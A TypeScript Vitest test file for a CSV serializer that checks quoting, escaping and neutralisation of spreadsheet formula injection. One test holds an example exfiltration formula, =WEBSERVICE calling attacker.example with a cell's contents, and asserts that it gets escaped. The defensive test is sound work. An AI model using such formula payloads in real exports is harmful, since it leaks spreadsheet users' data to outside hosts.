import { describe, expect, it } from "vitest";
import { toCsv } from "./csv";

describe("toCsv", () => {
  it("joins plain fields with commas and rows with CRLF", () => {
    expect(
      toCsv([
        ["a", "b"],
        ["c", "d"],
      ]),
    ).toBe("a,b\r\nc,d");
  });

  it("quotes fields containing a comma so columns do not shift", () => {
    expect(toCsv([["Doe, John", "x"]])).toBe('"Doe, John",x');
  });

  it("doubles embedded quotes", () => {
    expect(toCsv([['say "hi"']])).toBe('"say ""hi"""');
  });

  it("quotes fields containing line breaks", () => {
    expect(toCsv([["a\nb", "c\rd"]])).toBe('"a\nb","c\rd"');
  });

  it.each([
    "=",
    "+",
    "-",
    "@",
    "\t",
    "\r",
  ])("neutralises a field starting with %j so spreadsheets do not evaluate it", (prefix) => {
    const [field] = toCsv([[`${prefix}1+1`]]).split(",");
    expect(field?.replace(/^"/, "")).toMatch(/^'/);
  });

  it("neutralises a formula that also needs quoting", () => {
    expect(toCsv([['=WEBSERVICE("https://attacker.example/leak?"&A1)']])).toBe(
      '"\'=WEBSERVICE(""https://attacker.example/leak?""&A1)"',
    );
  });

  it("leaves # and other characters untouched", () => {
    expect(toCsv([["Team #1"]])).toBe("Team #1");
  });
});
